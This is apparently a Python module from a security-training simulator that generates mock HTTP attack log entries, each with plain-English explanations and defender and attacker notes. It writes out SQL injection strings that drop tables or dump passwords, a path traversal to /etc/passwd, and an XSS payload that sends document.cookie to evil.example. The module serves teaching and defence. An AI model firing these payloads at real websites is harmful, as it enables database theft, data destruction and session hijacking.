"""Attacks against your website through its public door (HTTP)."""
import random
import urllib.parse

WEIGHT = 10
CAT = "attack"

ATTACKERS = ["203.0.113.7", "91.240.118.172", "185.220.101.4", "159.223.44.19"]


def generate():
    atk = random.choice(ATTACKERS)
    kind = random.choice(["sqli", "traversal", "xss"])
    if kind == "sqli":
        payload = random.choice([
            "1' OR '1'='1",
            "1; DROP TABLE orders--",
            "1' UNION SELECT username, password FROM users--",
        ])
        return dict(
            title="SQL injection attempt",
            raw=(f"GET /products.php?id={urllib.parse.quote(payload)} HTTP/1.1\n"
                 f"Host: shop.company.io   from {atk}"),
            english=(f"A visitor ({atk}) typed code into your shop's web address: "
                     f"'{payload}'. They are trying to make your database obey "
                     f"their words — to hand over every customer's password, or "
                     f"even erase data. It only works if the website glues user "
                     f"input directly into its database questions."),
            category="attack", severity="high", src=atk, dst="shop.company.io",
            blue=("Did it fail (error / WAF block)? The real fix is parameterized "
                  "queries. Then search the logs for more probes from this IP."),
            red=("Injection is the classic 'data and commands in one string' "
                 "mistake — the app trusts strangers to type only innocent words."))
    if kind == "traversal":
        return dict(
            title="Path traversal attempt",
            raw=(f"GET /download?file=../../../../etc/passwd HTTP/1.1\n"
                 f"Host: files.company.io   from {atk}"),
            english=(f"{atk} asked your file-download page for a file OUTSIDE its "
                     f"folder — climbing the directory ladder ('../') toward the "
                     f"server's list of user accounts. Like asking a librarian "
                     f"for 'a book from the safe upstairs'."),
            category="attack", severity="high", src=atk, dst="files.company.io",
            blue=("Lock downloads to one folder, reject '../' patterns, and check "
                  "whether this request actually returned a 200."),
            red=("The app joins user text onto a file path without checking where "
                 "the path really ends up."))
    return dict(
        title="Cross-site scripting (XSS) probe",
        raw=(f"GET /search?q=%3Cscript%3Efetch('https://evil.example/s?c='"
             f"%2Bdocument.cookie)%3C/script%3E HTTP/1.1\n"
             f"Host: portal.company.io   from {atk}"),
        english=(f"{atk} planted a mini-program in your site's search box. If your "
                 f"site shows that text to other visitors, the program runs in "
                 f"THEIR browsers and can steal their login cookies — the attacker "
                 f"then becomes that person."),
        category="attack", severity="high", src=atk, dst="portal.company.io",
        blue=("Never echo user input as raw HTML — escape it. Check whether the "
              "payload was stored and shown back to other users."),
        red=("The site prints what strangers type, and the browser can't tell "
             "'decoration' from 'code'."))
